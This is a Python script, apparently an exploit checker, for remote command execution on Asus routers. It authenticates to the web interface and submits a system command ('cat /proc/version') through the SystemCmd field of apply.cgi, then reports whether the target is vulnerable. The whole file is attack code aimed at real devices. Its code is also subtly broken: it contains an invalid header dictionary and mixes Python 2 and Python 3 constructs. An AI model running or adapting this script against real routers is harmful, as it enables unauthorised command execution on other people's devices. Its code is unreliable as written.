import requests
import sys
import re
import base64
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""
def packet(target, port, cookie):
	try:
		#Login
		URL = 'http://'+target+':'+port+'/'
		headers = {'Cookie' : 'Authorization' : 'Basic ' + cookie}
		s = requests.Session()
		req = s.get(URL, headers=headers)
		
		#Section System Command
		URL = 'http://'+target+':'+port+'/Main_AdmStatus_Content.asp'
		req = s.get(URL, headers=headers)

		#Execute System Commands
		URL = 'http://'+target+':'+port+'/apply.cgi'
		params={'current_page': 'Main_AdmStatus_Content.asp',
			'next_page': 'Main_AdmStatus_Content.asp',
			'next_host': '',
			'sid_list': 'FirewallConfig;',
			'group_id': '',
			'modified': '0',
			'action_mode': ' Refresh ',
			'first_time': '',
			'action_script': '',
			'preferred_lang': 'EN',
			'SystemCmd': 'cat /proc/version',
			'action': 'Refresh'
		}
		req = s.post(URL, headers=headers, params=params)
		
		URL = 'http://'+target+':'+port+'/Main_AdmStatus_Content.asp'
		req = s.get(URL, headers=headers)
	
		if req.status_code == 200 and re.search('version', req.text):
			print (Fore.GREEN+" [+] Vulnarable"+Fore.RESET)
		else:
			print (Fore.YELLOW+" [-] Not Vulnarable"+Fore.RESET)

	except:
		print(Fore.YELLOW+" [-] Not Vulnarable"+Fore.RESET)
		pass


# MAIN
if __name__ == "__main__":
	print description
	if len(sys.argv) is not 5:
		print(Fore.YELLOW+" [-] Example: python Asus_Code_Execution.py <Target IP> <port> <ID> <Password>"+Fore.RESET)
		sys.exit(1)
	else:
		cookie = base64.encodestring(sys.argv[3]+':'+sys.argv[4]).rstrip('\n')
		packet(sys.argv[1], sys.argv[2], cookie)
